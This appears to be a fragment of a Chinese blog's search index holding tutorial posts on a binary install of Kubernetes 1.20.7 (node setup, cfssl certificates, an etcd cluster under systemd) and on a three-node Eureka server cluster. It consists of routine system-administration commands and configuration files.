二进制安装-etcd高可用部署(四)","uri":"/post/2467/"},{"categories":["系统服务","kubernetes"],"content":"四、创建systemd启动脚本 cat \u003e /etc/systemd/system/etcd.service \u003c\u003cEOF [Unit] Description=Etcd Server After=network.target After=network-online.target Wants=network-online.target Documentation=https://github.com/coreos [Service] Type=notify WorkingDirectory=/data/etcd/data/ ExecStart=/usr/local/bin/etcd \\\\ --name=etcd01 \\\\ --data-dir=/data/etcd/data/ \\\\ --wal-dir=/data/etcd/wal \\\\ --heartbeat-interval=200 \\\\ --election-timeout=1500 \\\\ --listen-peer-urls=https://172.17.20.201:2380 \\\\ --listen-client-urls=https://172.17.20.201:2379 \\\\ --initial-advertise-peer-urls=https://172.17.20.201:2380 \\\\ --advertise-client-urls=https://172.17.20.201:2379 \\\\ --initial-cluster=etcd01=https://172.17.20.201:2380,etcd02=https://172.17.20.202:2380,etcd03=https://172.17.20.203:2380 \\\\ --initial-cluster-state=new \\\\ --initial-cluster-token=k8s-etcd-cluster \\\\ --cert-file=/etc/kubernetes/pki/etcd/etcd.pem \\\\ --key-file=/etc/kubernetes/pki/etcd/etcd-key.pem \\\\ --client-cert-auth \\\\ --trusted-ca-file=/etc/kubernetes/pki/ca/ca.pem \\\\ --peer-cert-file=/etc/kubernetes/pki/etcd/etcd.pem \\\\ --peer-key-file=/etc/kubernetes/pki/etcd/etcd-key.pem \\\\ --peer-client-cert-auth \\\\ --peer-trusted-ca-file=/etc/kubernetes/pki/ca/ca.pem \\\\ --enable-v2=true \\\\ --logger=zap \\\\ --log-level=info Restart=on-failure RestartSec=5 LimitNOFILE=65536 [Install] WantedBy=multi-user.target EOF 如果你看懂了下面的参数介绍，相信你可以写出其他两台etcd节点的参数配置 参数简介 --name: 节点名称 --data-dir: 数据存储目录 --wal-dir: wal预写日志，所有的修改在提交之前都要先写入log文件中。默认路径在–data-dir目录下 --heartbeat-interval: 心跳间隔时间(毫秒)。leader通知所有的followers，他还是Leader的时间间隔。默认100ms --election-timeout: 选举超时的时间(毫秒)。表示follower在多久后还没有收到leader的心跳，他就申请选举自己为Leader。默认1000ms。关于raft动画介绍: http://thesecretlivesofdata.com/raft --listen-peer-urls: 监听地址，与集群其它成员通信的地址。 --listen-client-urls: 监听地址，与客户端通信的地址。 --initial-advertise-peer-urls: 向集群中其他成员通告自己的地址，对应--listen-peer-urls --advertise-client-urls: 向客户端通告自己的地址，对应--listen-client-urls。这里有一个助于理解的文档：https://www.jianshu.com/p/7bbef1ca9733 --initial-cluster: 指定与集群中其他成员的通信地址(所有节点的地址)。形式为:name=http://xxxx:2380,name代表--name指定的值 --initial-cluster-state: 指定new或existing.前者为初始化新的集群，后者代表加入现有集群 --initial-cluster-token: 引导期间etcd集群的初始集群令牌,同一个集群令牌一致。 --cert-file: 服务端证书 --key-file: 服务端证书私钥 --client-cert-auth: 启用客户端证书认证 --trusted-ca-file: 指定信任的CA(校验客户端证书) --peer-cert-file: 集群间通信的证书 --peer-key-file: 集群间通信的证书私钥 --peer-client-cert-auth: 启用集群间通信证书认证 --peer-trusted-ca-file: 指定信任的CA(校验集群间通信证书) --enable-v2: 启用v2版本api --logger: 指定日志器，默认capnslog,在3.5版本中已弃用。可选项zap是结构化日志。 --log-level: 日志级别，可选项debug, info, warn, error, panic, fatal。默认info 其他etcd节点配置 etcd02 cat \u003e /etc/systemd/system/etcd.service \u003c\u003cEOF [Unit] Description=Etcd Server After=network.target After=network-online.target Wants=network-online.target Documentation=https://github.com/coreos [Service] Type=notify WorkingDirectory=/data/etcd/data/ ExecStart=/usr/local/bin/etcd \\\\ --name=etcd02 \\\\ --data-dir=/data/etcd/data/ \\\\ --wal-dir=/data/etcd/wal \\\\ --heartbeat-interval=200 \\\\ --election-timeout=1500 \\\\ --listen-peer-urls=https://172.17.20.202:2380 \\\\ --listen-client-urls=https://172.17.20.202:2379 \\\\ --initial-advertise-peer-urls=https://172.17.20.202:2380 \\\\ --advertise-client-urls=https://172.17.20.202:2379 \\\\ --initial-cluster=etcd01=https://172.17.20.201:2380,etcd02=https://172.17.20.202:2380,etcd03=https://172.17.20.203:2380 \\\\ --initial-cluster-state=new \\\\ --initial-cluster-token=k8s-etcd-cluster \\\\ --cert-file=/etc/kubernetes/pki/etcd/etcd.pem \\\\ --key-file=/etc/kubernetes/pki/etcd/etcd-key.pem \\\\ --client-cert-auth \\\\ --trusted-ca-file=/etc/kubernetes/pki/ca/ca.pem \\\\ --peer-cert-file=/etc/kubernetes/pki/etcd/etcd.pem \\\\ --peer-key-file=/etc/kubernetes/pki/etcd/etcd-key.pem \\\\ --peer-client-cert-auth \\\\ --peer-trusted-ca-file=/etc/kubernetes/pki/ca/ca.pem \\\\ --enable-v2=true \\\\ --logger=zap \\\\ --log-level=info Restart=on-failure RestartSec=5 LimitNOFILE=65536 [Install] WantedBy=multi-user.target EOF etcd03 cat \u003e /etc/systemd/system/etcd.service \u003c\u003cEOF [Unit] Description=Etcd Server After=network.target A","date":"2021-06-16 10:46","objectID":"/post/2467/:0:4","tags":["k8s","etcd"],"title":"kubernetes 1.20.7 二进制安装-etcd高可用部署(四)","uri":"/post/2467/"},{"categories":["系统服务","kubernetes"],"content":"四、启动服务 systemctl start etcd systemctl enable etcd ","date":"2021-06-16 10:46","objectID":"/post/2467/:0:5","tags":["k8s","etcd"],"title":"kubernetes 1.20.7 二进制安装-etcd高可用部署(四)","uri":"/post/2467/"},{"categories":["系统服务","kubernetes"],"content":"五、查看节点状态 for i in {201..203};do \\ ETCDCTL_API=3 etcdctl \\ --endpoints=https://172.17.20.$i:2379 \\ --cacert=/etc/kubernetes/pki/ca/ca.pem \\ --cert=/etc/kubernetes/pki/etcd/etcd.pem \\ --key=/etc/kubernetes/pki/etcd/etcd-key.pem endpoint health \\ ;done 67653-c2qvr56o7ha.png ","date":"2021-06-16 10:46","objectID":"/post/2467/:0:6","tags":["k8s","etcd"],"title":"kubernetes 1.20.7 二进制安装-etcd高可用部署(四)","uri":"/post/2467/"},{"categories":["系统服务","kubernetes"],"content":"六、查看集群状态 ETCDCTL_API=3 etcdctl \\ -w table \\ --endpoints=https://172.17.20.201:2379,https://172.17.20.202:2379,https://172.17.20.203:2379 \\ --cacert=/etc/kubernetes/pki/ca/ca.pem --cert=/etc/kubernetes/pki/etcd/etcd.pem \\ --key=/etc/kubernetes/pki/etcd/etcd-key.pem endpoint status 23477-u5g7bmvnx7.png ","date":"2021-06-16 10:46","objectID":"/post/2467/:0:7","tags":["k8s","etcd"],"title":"kubernetes 1.20.7 二进制安装-etcd高可用部署(四)","uri":"/post/2467/"},{"categories":["kubernetes"],"content":"一、下载安装cfssl工具 wget -O /usr/local/bin/cfssl https://github.com/cloudflare/cfssl/releases/download/v1.6.0/cfssl_1.6.0_linux_amd64 wget -O /usr/local/bin/cfssljson https://github.com/cloudflare/cfssl/releases/download/v1.6.0/cfssljson_1.6.0_linux_amd64 wget -O /usr/local/bin/cfssl-certinfo https://github.com/cloudflare/cfssl/releases/download/v1.6.0/cfssl-certinfo_1.6.0_linux_amd64 chmod +x /usr/local/bin/cfssl* ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:1","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-使用cfssl生成配置证书(三)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"二、配置工作目录 mkdir /etc/kubernetes/pki/{ca,etcd} -p cd /etc/kubernetes/pki/ca ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:2","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-使用cfssl生成配置证书(三)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"三、配置CA机构 1.生成自签CA # 创建自签证书请求配置文件 cat \u003e ca-csr.json \u003c\u003cEOF { \"ca\": { \"expiry\": \"438000h\" }, \"CN\": \"kubernetes\", \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"names\": [ { \"C\": \"CN\", \"ST\": \"Shanghai\", \"L\": \"Shanghai\", \"O\": \"k8s\", \"OU\": \"System\" } ] } EOF # 生成ca的证书签名请求文件、ca私钥、ca证书 cfssl gencert -initca ca-csr.json | cfssljson -bare ca ca.expiry:: ca证书的过期时间，默认5年，我改成了50年 CN: Common Name，kube-apiserver 从证书中提取该字段作为请求的用户名 (User Name)；浏览器使用该字段验证网站是否合法； O: Organization，kube-apiserver 从证书中提取该字段作为请求用户所属的组 (Group) C: 国家 ST: 省份 L: 城市 2.准备CA用于签发的配置文件 后面使用的证书都会使用我们之前生成的CA来颁发，下面是颁发证书时的默认配置 cat \u003e ca-config.json \u003c\u003c EOF { \"signing\": { \"default\": { \"expiry\": \"87600h\" }, \"profiles\": { \"kubernetes\": { \"expiry\": \"87600h\", \"usages\": [ \"signing\", \"key encipherment\", \"server auth\", \"client auth\" ] } } } } EOF default.expiry: 全局配置，颁发的证书默认有效期10年 profiles中可以定义多个配置，这里定义了一个kubernetes，在使用的时候可以指定profile。例如: -config=ca-config.json -profile=kubernetes ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:3","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-使用cfssl生成配置证书(三)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"四、签发etcd证书 1.创建证书请求配置文件 cd /etc/kubernetes/pki/etcd/ cat \u003e etcd-csr.json \u003c\u003cEOF { \"CN\": \"etcd\", \"hosts\": [ \"127.0.0.1\", \"172.17.20.201\", \"172.17.20.202\", \"172.17.20.203\" ], \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"names\": [ { \"C\": \"CN\", \"ST\": \"Shanghai\", \"L\": \"Shanghai\", \"O\": \"k8s\", \"OU\": \"System\" } ] } EOF 这里的hosts也可以改成域名、会灵活一些，更换IP也不影响证书使用 2.签发证书 cfssl gencert -ca /etc/kubernetes/pki/ca/ca.pem -ca-key /etc/kubernetes/pki/ca/ca-key.pem -config /etc/kubernetes/pki/ca/ca-config.json --profile kubernetes ./etcd-csr.json | cfssljson -bare etcd ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:4","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-使用cfssl生成配置证书(三)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"五.签发apiserver证书 apiserver服务端证书，用于证明自己是apiserver身份的。（通过hosts确认） 1.创建证书请求配置文件 cd /etc/kubernetes/pki/ cat \u003e apiserver-csr.json \u003c\u003cEOF { \"CN\": \"kubernetes\", \"hosts\": [ \"127.0.0.1\", \"172.17.20.201\", \"172.17.20.202\", \"172.17.20.203\", \"172.17.20.200\", \"10.1.0.1\", \"kubernetes\", \"kubernetes.default\", \"kubernetes.default.svc\", \"kubernetes.default.svc.cluster\", \"kubernetes.default.svc.cluster.local\" ], \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"names\": [ { \"C\": \"CN\", \"ST\": \"Shanghai\", \"L\": \"Shanghai\", \"O\": \"k8s\", \"OU\": \"System\" } ] } EOF hosts需要填写master节点地址和vip,集群内部通信会用内部地址,所以也需要写上service ip以及内部域名。 2.签发证书 cfssl gencert -ca /etc/kubernetes/pki/ca/ca.pem -ca-key /etc/kubernetes/pki/ca/ca-key.pem -config /etc/kubernetes/pki/ca/ca-config.json --profile kubernetes ./apiserver-csr.json | cfssljson -bare apiserver ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:5","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-使用cfssl生成配置证书(三)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"五.签发controller-manager证书 controller-manager作为apiserver的客户端，这里配置的是客户端证书,包含了客户端的信息。（CN代表用户） 1.创建证书请求配置文件 cd /etc/kubernetes/pki/ cat \u003e kube-controller-manager.json \u003c\u003cEOF { \"CN\": \"system:kube-controller-manager\", \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"hosts\": [ \"127.0.0.1\", \"172.17.20.201\", \"172.17.20.202\", \"172.17.20.203\" ], \"names\": [ { \"C\": \"CN\", \"ST\": \"Shanghai\", \"L\": \"Shanghai\", \"O\": \"k8s\", \"OU\": \"System\" } ] } EOF k8s有一个内置的ClusterRoleBinding名为system:kube-controller-manager。 这个clusterrolebinding将system:kube-controller-manager这个clusterrole与用户system:kube-controller-manager绑定 k8s通过证书中的CN获取用户名,所以指定CN为system:kube-controller-manager作为用户名,并且证书是由CA签名过的，所以CN指定的用户名是可信的。 如果部署完后你想查看，可以通过如下命令:k get ClusterRolebinding system:kube-controller-manager -o yaml 官方说明：https://kubernetes.io/zh/docs/setup/best-practices/certificates/#%E4%B8%BA%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E9%85%8D%E7%BD%AE%E8%AF%81%E4%B9%A6 controller-manager的高可用通过选举实现，只有一个实例在真正工作，所以这里的证书扩展中没有vip，我们的vip是给apiserver使用的。 2.签发证书 cfssl gencert -ca /etc/kubernetes/pki/ca/ca.pem -ca-key /etc/kubernetes/pki/ca/ca-key.pem -config /etc/kubernetes/pki/ca/ca-config.json --profile kubernetes ./kube-controller-manager.json | cfssljson -bare kube-controller-manager ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:6","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-使用cfssl生成配置证书(三)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"六.签发scheduler证书 scheduler作为apiserver的客户端，这里配置的是客户端证书,包含了客户端的信息。（CN代表用户） 1.创建证书请求配置文件 cd /etc/kubernetes/pki/ cat \u003e kube-scheduler.json \u003c\u003cEOF { \"CN\": \"system:kube-scheduler\", \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"hosts\": [ \"127.0.0.1\", \"172.17.20.201\", \"172.17.20.202\", \"172.17.20.203\" ], \"names\": [ { \"C\": \"CN\", \"ST\": \"Shanghai\", \"L\": \"Shanghai\", \"O\": \"k8s\", \"OU\": \"System\" } ] } EOF 2.签发证书 cfssl gencert -ca /etc/kubernetes/pki/ca/ca.pem -ca-key /etc/kubernetes/pki/ca/ca-key.pem -config /etc/kubernetes/pki/ca/ca-config.json --profile kubernetes ./kube-scheduler.json | cfssljson -bare kube-scheduler ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:7","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-使用cfssl生成配置证书(三)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"七.签发kubectl(admin)证书 这里配置的是集群管理员(客户端)证书，kubectl作为客户端，需要指定一个配置文件(kubeconfig)，生成配置文件需要用到此证书。 1.创建证书请求配置文件 cd /etc/kubernetes/pki/ cat \u003e admin.json \u003c\u003cEOF { \"CN\": \"admin\", \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"hosts\": [], \"names\": [ { \"C\": \"CN\", \"ST\": \"Shanghai\", \"L\": \"Shanghai\", \"O\": \"system:masters\", \"OU\": \"System\" } ] } EOF 可以看下第五部分的简介，只不过这里绑定的不是User(用户)，而是Group(组),使用O指定组。如果部署完后你想查看，可以通过如下命令:k get ClusterRolebinding cluster-admin -o yaml 所以这里的CN可以随便写 2.签发证书 cfssl gencert -ca /etc/kubernetes/pki/ca/ca.pem -ca-key /etc/kubernetes/pki/ca/ca-key.pem -config /etc/kubernetes/pki/ca/ca-config.json --profile kubernetes ./admin.json | cfssljson -bare admin ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:8","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-使用cfssl生成配置证书(三)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"八.签发kube-proxy证书 1.创建证书请求配置文件 cd /etc/kubernetes/pki/ cat \u003e kube-proxy.json \u003c\u003cEOF { \"CN\": \"system:kube-proxy\", \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"hosts\": [], \"names\": [ { \"C\": \"CN\", \"ST\": \"Shanghai\", \"L\": \"Shanghai\", \"O\": \"k8s\", \"OU\": \"System\" } ] } EOF 一个名为system:node-proxier的ClusterRoleBinding，将ClusterRole system:node-proxier与User(用户)system:kube-proxy绑定 kube-proxy是node节点组件，IP并不是固定的，所以这里没有写hosts 2.签发证书 cfssl gencert -ca /etc/kubernetes/pki/ca/ca.pem -ca-key /etc/kubernetes/pki/ca/ca-key.pem -config /etc/kubernetes/pki/ca/ca-config.json --profile kubernetes ./kube-proxy.json | cfssljson -bare kube-proxy ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:9","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-使用cfssl生成配置证书(三)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"九、关于kubelet证书 https://kubernetes.io/zh/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/ 当集群开启了 TLS 认证后，每个节点的 kubelet 组件都要使用由 apiserver 使用的 CA 签发的有效证书才能与 apiserver 通讯；此时如果节点多起来，为每个节点单独签署证书将是一件非常繁琐的事情； TLS bootstrapping 功能就是让 node节点上的kubelet组件先使用一个预定的低权限用户连接到 apiserver，然后向 apiserver 申请证书，kubelet 的证书由 apiserver 动态签署； ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:10","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-使用cfssl生成配置证书(三)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"十、配置flannel证书 1.创建证书请求配置文件 cd /etc/kubernetes/pki/ cat \u003e flannel-csr.json \u003c\u003cEOF { \"CN\": \"flannel\", \"key\": { \"algo\": \"rsa\", \"size\": 2048 }, \"names\": [ { \"C\": \"CN\", \"ST\": \"Shanghai\", \"L\": \"Shanghai\", \"O\": \"k8s\", \"OU\": \"System\" } ] } EOF 2.签发证书 cfssl gencert -ca /etc/kubernetes/pki/ca/ca.pem -ca-key /etc/kubernetes/pki/ca/ca-key.pem -config /etc/kubernetes/pki/ca/ca-config.json --profile kubernetes ./flannel-csr.json | cfssljson -bare flannel 此证书用于访问etcd使用 ","date":"2021-06-15 15:28","objectID":"/post/2462/:0:11","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-使用cfssl生成配置证书(三)","uri":"/post/2462/"},{"categories":["kubernetes"],"content":"所有节点执行 ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:0","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-初始化环境(二)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"一、升级内核 # 导入公钥 rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org # 安装elrepo源 yum install -y https://www.elrepo.org/elrepo-release-7.el7.elrepo.noarch.rpm # 查看kernel版本 yum --disablerepo=\\* --enablerepo=elrepo-kernel list --showduplicates | grep kernel-lt # 安装新版kernel yum --disablerepo=\\* --enablerepo=elrepo-kernel install -y kernel-lt-5.4.125-1.el7.elrepo # 删除旧版kernel相关包 yum remove kernel-headers-3.10.0-1160.15.2.el7.x86_64 kernel-tools-libs-3.10.0-1062.el7.x86_64 kernel-tools-3.10.0-1062.el7.x86_64 # 安装新版kernel相关包 yum --disablerepo=* --enablerepo=elrepo-kernel install -y kernel-lt-tools-5.4.125-1.el7.elrepo kernel-lt-tools-libs-5.4.125-1.el7.elrepo kernel-lt-headers-5.4.125-1.el7.elrepo # 修改为默认内核 grub2-set-default 0 # 重启服务器 reboot ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:1","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-初始化环境(二)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"二、修改hosts cat \u003e\u003e /etc/hosts \u003c\u003c EOF 172.17.20.201 master01 172.17.20.202 master02 172.17.20.203 master03 172.17.20.210 node01 172.17.20.211 node02 172.17.20.212 node03 EOF ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:2","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-初始化环境(二)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"三、关闭防火墙和selinux systemctl stop firewalld setenforce 0 sed -i 's/^SELINUX=.\\*/SELINUX=disabled/' /etc/selinux/config ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:3","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-初始化环境(二)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"四、关闭swap swapoff -a sed -i 's/.*swap.*/#\u0026/' /etc/fstab ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:4","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-初始化环境(二)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"五、安装常用软件包 yum -y install bridge-utils chrony ipvsadm ipset sysstat conntrack libseccomp wget tcpdump screen vim nfs-utils bind-utils wget socat telnet sshpass net-tools sysstat lrzsz yum-utils device-mapper-persistent-data lvm2 tree nc lsof strace nmon iptraf iftop rpcbind mlocate ipvsadm ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:5","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-初始化环境(二)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"六、时间同步 yum install -y chrony systemctl start chronyd systemctl enable chronyd ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:6","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-初始化环境(二)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"七、修改资源限制 \u003e /etc/security/limits.d/20-nproc.conf cat \u003e\u003e /etc/security/limits.conf \u003c\u003cEOF * soft noproc 65535 * hard noproc 65535 * soft nofile 65535 * hard nofile 65535 * soft memlock unlimited * hard memlock unlimited EOF ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:7","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-初始化环境(二)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"八、加载ipvs内核模块 cat \u003e /etc/sysconfig/modules/ipvs.modules \u003c\u003cEOF #!/bin/bash modprobe -- ip_vs modprobe -- ip_vs_rr modprobe -- ip_vs_wrr modprobe -- ip_vs_sh modprobe -- nf_conntrack_ipv4 # 4.19内核已改名为nf_conntrack，这里报错可忽略 modprobe -- overlay modprobe -- br_netfilter EOF chmod 755 /etc/sysconfig/modules/ipvs.modules bash /etc/sysconfig/modules/ipvs.modules lsmod | grep -e ip_vs -e nf_conntrack_ipv4 ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:8","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-初始化环境(二)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"九、修改内核参数 cat \u003e /etc/sysctl.d/k8s.conf \u003c\u003cEOF net.bridge.bridge-nf-call-iptables=1 net.bridge.bridge-nf-call-ip6tables=1 net.ipv4.ip_forward=1 vm.swappiness=0 # 禁止使用 swap 空间，只有当系统 OOM 时才允许使用它 vm.overcommit_memory=1 # 不检查物理内存是否够用 vm.panic_on_oom=0 # 内存不足时，开启OOM fs.file-max=52706963 # 系统级打开最大文件句柄的数量 fs.nr_open=52706963 # 系统级打开最大进程的数量 net.netfilter.nf_conntrack_max=2310720 # 最大连接状态跟踪数量 EOF sysctl -p /etc/sysctl.d/k8s.conf ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:9","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-初始化环境(二)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"十、免密配置(可选) ssh-keygen -t rsa -P '' -f ~/.ssh/id_rsa for i in `awk '/172/{print $1}' /etc/hosts | uniq`;do ssh-copy-id -i ~/.ssh/id_rsa.pub root@$i ;done ","date":"2021-06-15 12:46","objectID":"/post/2457/:1:10","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-初始化环境(二)","uri":"/post/2457/"},{"categories":["kubernetes"],"content":"一、机器规划: IP 主机名 服务 172.17.20.201 master01 kube-apiserver、kube-controller-manager、kube-scheduler、etcd 172.17.20.202 master02 kube-apiserver、kube-controller-manager、kube-scheduler、etcd 172.17.20.203 master03 kube-apiserver、kube-controller-manager、kube-scheduler、etcd 172.17.20.210 node01 kubelet、kube-proxy 172.17.20.211 node02 kubelet、kube-proxy 172.17.20.212 node03 kubelet、kube-proxy 172.17.20.198 nginx01 nginx、keepalived 172.17.20.199 nginx02 nginx、keepalived 172.17.20.200 - 负载均衡vip ","date":"2021-06-15 11:33","objectID":"/post/2456/:0:1","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-规划(一)","uri":"/post/2456/"},{"categories":["kubernetes"],"content":"二、各个组件版本 | 组件 | 版本| 高可用实现 | | ———|—- | kube-apiserver | v1.20.7 | 横向扩展+nginx | | kube-controller-manager | v1.20.7 | leader选举 | | kube-scheduler | v1.20.7 | leader选举 | | kube-proxy | v1.20.7 | 无 | | kubelet | v1.20.7 | 无| | etcd | v3.4.16 | leader选举 | | docker | v19.03.9 | 无 | | flannel | v0.14.0 | 无 | ","date":"2021-06-15 11:33","objectID":"/post/2456/:0:2","tags":["k8s"],"title":"kubernetes 1.20.7 二进制安装-规划(一)","uri":"/post/2456/"},{"categories":["其他","基础内容"],"content":"机器分配 eureka1: 172.17.10.240 eureka2: 172.17.10.241 eureka3: 172.17.10.242 ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:1","tags":["eureka"],"title":"eureka-server集群部署","uri":"/post/2444/"},{"categories":["其他","基础内容"],"content":"1.源码下载 ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:2","tags":["eureka"],"title":"eureka-server集群部署","uri":"/post/2444/"},{"categories":["其他","基础内容"],"content":"2.添加eureka注解 cd /server/packages/ unzip eureka-server.zip cd eureka-server/src/main/java/cn/soulchild/eurekaserver/ sed -i '4iimport org.springframework.cloud.netflix.eureka.server.EnableEurekaServer;' EurekaServerApplication.java sed -i '6i@EnableEurekaServer' EurekaServerApplication.java ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:3","tags":["eureka"],"title":"eureka-server集群部署","uri":"/post/2444/"},{"categories":["其他","基础内容"],"content":"3.修改配置文件 添加三个eureka的配置文件 cd /server/packages/eureka-server cat \u003e src/main/resources/application-eureka1.yml \u003c\u003cEOF spring: application: name: eureka-server server: port: 8761 eureka: instance: # 指定instance-id为ip:port的形式，在页面中显示的就是ip+port，不指定此选项显示主机名 instance-id: ${spring.cloud.client.ip-address}:${server.port} # 这里使用ip的方式注册,使用hostname需要支持解析才行 prefer-ip-address: true # 客户端配置 client: # 是否将自己注册到注册中心 register-with-eureka: true # 是否从注册中心获取信息 fetch-registry: true serviceUrl: defaultZone: http://172.17.10.241:8761/eureka/,http://172.17.10.242:8761/eureka/ # 控制eureka页面显示内容 environment: \"dev\" datacenter: \"bj-yz\" EOF #################################################### cat \u003e src/main/resources/application-eureka2.yml \u003c\u003cEOF spring: application: name: eureka-server server: port: 8761 eureka: instance: # 指定instance-id为ip:port的形式，在页面中显示的就是ip+port，不指定此选项显示主机名 instance-id: ${spring.cloud.client.ip-address}:${server.port} # 这里使用ip的方式注册,使用hostname需要支持解析才行 prefer-ip-address: true # 客户端配置 client: # 是否将自己注册到注册中心 register-with-eureka: false # 是否从注册中心获取信息 fetch-registry: false serviceUrl: defaultZone: http://172.17.10.240:8761/eureka/,http://172.17.10.242:8761/eureka/ # 控制eureka页面显示内容 environment: \"dev\" datacenter: \"bj-yz\" EOF #################################################### cat \u003e src/main/resources/application-eureka3.yml \u003c\u003cEOF spring: application: name: eureka-server server: port: 8761 eureka: instance: # 指定instance-id为ip:port的形式，在页面中显示的就是ip+port，不指定此选项显示主机名 instance-id: ${spring.cloud.client.ip-address}:${server.port} # 这里使用ip的方式注册,使用hostname需要支持解析才行 prefer-ip-address: true # 客户端配置 client: # 是否将自己注册到注册中心 register-with-eureka: false # 是否从注册中心获取信息 fetch-registry: false serviceUrl: defaultZone: http://172.17.10.240:8761/eureka/,http://172.17.10.241:8761/eureka/ # 控制eureka页面显示内容 environment: \"dev\" datacenter: \"bj-yz\" EOF 也可以将上面的三个文件合并成一个文件 vim src/main/resources/application.yml spring: application: name: eureka-server server: port: 8761 eureka: instance: # 指定instance-id为ip:port的形式，在页面中显示的就是ip+port，不指定此选项显示主机名 instance-id: ${spring.cloud.client.ip-address}:${server.port} # 这里使用ip的方式注册,使用hostname需要支持解析才行 prefer-ip-address: true # 客户端配置 client: # 是否将自己注册到注册中心 register-with-eureka: true # 是否从注册中心获取信息 fetch-registry: true --- spring: profiles: eureka1 eureka: client: serviceUrl: defaultZone: http://172.17.10.241:8761/eureka/,http://172.17.10.242:8761/eureka/ --- spring: profiles: eureka2 eureka: client: service-url: defaultZone: http://172.17.10.240:8761/eureka/,http://172.17.10.242:8761/eureka/ --- spring: profiles: eureka3 eureka: client: service-url: defaultZone: http://172.17.10.240:8761/eureka/,http://172.17.10.241:8761/eureka/ ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:4","tags":["eureka"],"title":"eureka-server集群部署","uri":"/post/2444/"},{"categories":["其他","基础内容"],"content":"4.打包 ./mvnw clean package ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:5","tags":["eureka"],"title":"eureka-server集群部署","uri":"/post/2444/"},{"categories":["其他","基础内容"],"content":"5.运行 三台机器运行各自的配置 # eureka1 java -Dspring.profiles.active=eureka1 -jar target/eureka-server-0.0.1-SNAPSHOT.jar # eureka2 java -Dspring.profiles.active=eureka2 -jar target/eureka-server-0.0.1-SNAPSHOT.jar # eureka3 java -Dspring.profiles.active=eureka3 -jar target/eureka-server-0.0.1-SNAPSHOT.jar ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:6","tags":["eureka"],"title":"eureka-server集群部署","uri":"/post/2444/"},{"categories":["其他","基础内容"],"content":"6.运行结果 53633-57774y6sww3.png 29273-juglpz4gzn8.png 12890-hna531w53h8.png ","date":"2021-06-11 14:10","objectID":"/post/2444/:0:7","tags":["eureka"],"title":"eureka-server集群部署","uri":"/post/2444/"},{"categories":["其他","基础内容"],"content":"7.注册服务测试 